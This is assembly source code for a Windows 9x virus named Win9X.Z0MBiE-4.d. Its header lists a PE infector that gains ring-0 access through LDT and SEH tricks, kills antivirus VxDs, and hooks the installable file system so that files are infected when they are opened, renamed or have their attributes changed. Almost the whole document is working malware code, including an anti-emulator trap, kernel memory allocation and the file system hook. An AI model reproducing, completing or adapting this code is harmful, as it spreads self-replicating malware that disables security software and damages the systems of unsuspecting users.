
; ---------------------------------------------------------------------------
; Win9X.Z0MBiE-4.d
;
; - PE infector (poly, last section appending)
; - jmp-to-virus inserted into entrypoint + N bytes
; - ring0-resident via LDT+SEH, LDT scanning
; - standard on-IFS-call file infecting
; - kill AV VxDs when entered ring-0 (avp/web)
; - file shares are patched, so opened and/or readonly files are infected too
;
; engines used: LDE32, KILLAVXD
;                                                       http://z0mbie.cjb.net
; ---------------------------------------------------------------------------

IO_DX                   equ     666h
IO_AL                   equ     77h

getofs                  macro   reg, lab
                        call    $+5
                        pop     reg
                        sub     reg, $-1-offset lab
                        endm

include                 mz.inc
include                 pe.inc
include                 consts.inc

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data
start:


include                 seh.inc
include                 find_ldt.inc
include                 ring0.inc
include                 r0io.inc
include                 infect.inc
include                 lde32bin.inc
include                 killavxd.inc

entry:
                        pushf
                        pusha

                        lea     esi, [esp+32+4]

                        pusha                   ; fuck emulator
                        seh_init
                        xor     ecx, ecx
                        div     ecx
                        db      0ffh,0ffh
                        iret
                        seh_done
                        popa

                        call    callring0

                        popa
                        popf

                        ret

ring0handler:           pusha

                        mov     ecx, 5

                        mov     edi, [esi]
                        sub     edi, ecx
                        mov     [esi], edi

                        call    __pop1
orig_bytes              db      5 dup (90h)
__pop1:                 pop     esi

                        cld
                        rep     movsb

                        push    ecx
                        push    eax
                        sgdt    [esp+2]
                        pop     eax
                        pop     ecx
                        shr     eax, 16         ; ecx=base, eax=limit=size-1

                        cmp     byte ptr [eax+ecx], 'Z'
                        je      __exit
                        mov     byte ptr [eax+ecx], 'Z'

                        mov     ecx, virsize
                        sub     esp, ecx
                        getofs  esi, start
                        mov     edi, esp
                        rep     movsb

                        call    Win9X_Patch_AV_VxDs

; allocate memory
                        push    PAGEFIXED + PAGEZEROINIT
                        xor     eax, eax
                        push    eax     ; PhysAddr
                        push    eax     ; maxPhys
                        push    eax     ; minPhys
                        push    eax     ; Align
                        push    eax     ; handle of VM = 0 if PG_SYS
                        push    PG_SYS  ; allocate memory in system area
                        push    virpages; nPages
                        VMMcall PageAllocate
                        add     esp, 8*4

                        test    eax, eax
                        jnz     __okey
                        add     esp, virsize
                        jmp     __exit
__okey:

; copy virus to new location

                        xchg    ebp, eax

                        mov     esi, esp
                        mov     edi, ebp
                        mov     ecx, virsize
                        rep     movsb

                        mov     esi, esp
                        lea     edi, vircopy-start[ebp]
                        mov     ecx, virsize
                        rep     movsb

                        add     esp, virsize

; protect memory from ring3-access

                        mov     eax, ebp
                        shr     eax, 12

                        push    PC_STATIC                       ; OR_MASK
                        push    not (PC_WRITEABLE+PC_USER)      ; AND_MASK
                        push    virpages
                        push    eax
                        VMMcall PageModifyPermissions
                        add     esp, 4*4

; install file system handler

                        lea     eax, ifs_handler-start[ebp]
                        push    eax
                        VxDcall IFSMGR, InstallFileSystemApiHook
                        pop     ecx
                        mov     old_ifs_handler_ptr_ptr-start[ebp], eax

__exit:                 popa
                        ret

ifs_handler:            push    ebp

                        getofs  ebp, ifs_handler_entered

                        cmp     byte ptr [ebp], 0
                        jne     __quit
                        inc     byte ptr [ebp]

                        mov     eax, [esp]._function

                        cmp     eax, IFSFN_OPEN
                        je      __my_func
                        cmp     eax, IFSFN_RENAME
                        je      __my_func
                        cmp     eax, IFSFN_FILEATTRIB
                        je      __my_func

__exit:                 dec     byte ptr [ebp]

__quit:                 pop     ebp

                        getofs  eax, old_ifs_handler_ptr_ptr
                        mov     eax, [eax]
                        jmp     [eax]

__my_func:              pusha

                        getofs  edi, filename
                        cld

                        mov     eax, [esp]._drive + 32

                        or      al, al
                        jle     __skip

; build file name
                        add     al, 'A'-1
                        stosb
                        mov     al, ':'
                        stosb

                        mov     eax, [esp]._ioreq_ptr + 32
                        mov     eax, [eax+0Ch]  ; eax <-- filename
                        add     eax, 4          ; skip "

                        push    [esp]._codepage+32 ; BCS_WANSI/BCS_OEM
                        push    MAXPATH-1       ; max name length
                        push    eax             ; uni-str
                        push    edi             ; output-str
                        VxDcall IFSMGR, UniToBCSPath
                        add     esp, 4*4

                        or      edx, edx        ; converted normally?
                        jnz     __skip

                        mov     [edi+eax], dl   ; NUL

                        mov     eax, [edi+eax-4]
                        or      eax, 20202000h
                        cmp     eax, 'm0z.'
                        jne     __skip

                        getofs  edx, filename
                        call    infect_file

__skip:                 popa
                        jmp     __exit

csize                   equ     $-start
                        db      4096-csize dup (0)
virsize                 equ     $-start

vircopy                 db      virsize dup (?)

ifs_handler_entered     db      ?
old_ifs_handler_ptr_ptr dd      ?
filename                db      MAXPATH dup (?)

tbl                     db      2048 dup (?)
eip_buf                 db      4096 dup (?)
eip_buf_size            equ     $-eip_buf

virpages                equ     ($-start+4095)/4096

                        .code

db 13,10
db '--------------------',13,10
db 'codesize = '
db csize/1000 mod 10+'0'
db csize/ 100 mod 10+'0'
db csize/  10 mod 10+'0'
db csize/   1 mod 10+'0'
db ' bytes',13,10
db '--------------------',13,10


loader:
                        call    entry
                        ret

cmd                     db 0f6h,45h,0e8h,01h

                        end     loader
